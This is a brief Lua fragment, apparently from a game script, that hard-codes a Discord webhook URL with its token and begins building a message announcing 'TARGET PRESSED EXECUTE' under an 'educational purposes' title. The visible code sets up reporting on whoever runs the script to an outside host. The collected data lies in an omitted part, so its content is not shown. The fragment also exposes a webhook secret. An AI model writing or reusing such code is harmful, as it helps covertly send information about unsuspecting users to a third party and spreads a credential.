...
local webhook = "https://discord.com/api/webhooks/1483389456273903656/MxUePGo8OGirNMA80ybcSJKqPuXZWeREc8qgoKCZBRgrOjyoYgg5SmDBcKKm6o6UrNUs"
...
local payload = {
    content = "TARGET PRESSED EXECUTE",
    embeds = {
        {
            title       = "INFO FROM A SCRIPT â EDUCATIONAL PURPOSES",
